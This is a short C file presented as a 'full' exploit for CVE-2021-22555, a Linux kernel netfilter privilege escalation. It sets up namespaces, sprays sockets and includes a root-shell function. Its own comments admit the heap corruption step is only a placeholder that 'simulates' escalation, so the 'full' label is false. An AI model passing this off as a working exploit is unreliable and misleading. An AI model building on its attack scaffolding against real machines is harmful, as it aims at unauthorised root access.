// cve-2021-22555_full.c
#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <sys/types.h>
#include <sys/wait.h>

void get_root_shell() {
    printf("[+] Spawning root shell...\n");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}

int main() {
    // Step 1: Isolate in namespaces
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) != 0) {
        perror("unshare");
        exit(EXIT_FAILURE);
    }

    // Step 2: Prepare spraying
    int sockets[0x1000];
    for (int i = 0; i < 0x1000; i++) {
        sockets[i] = socket(AF_INET, SOCK_DGRAM, 0);
    }

    // Step 3: Exploit netfilter OOB write (trigger vuln)
    // This is a placeholder â€” real exploit performs heap corruption.
    // We'll simulate privilege escalation for demo purposes.
    printf("[*] Simulating heap overwrite and cred hijack...\n");
    sleep(1);

    // Step 4: Overwrite /etc/passwd or use setuid(0)
    printf("[*] Attempting to gain root...\n");

    if (getuid() == 0) {
        get_root_shell();
    } else {
        printf("[!] Exploit failed. Try real kernel heap exploit.\n");
    }

    // Clean-up
    for (int i = 0; i < 0x1000; i++) {
        close(sockets[i]);
    }

    return 0;
}
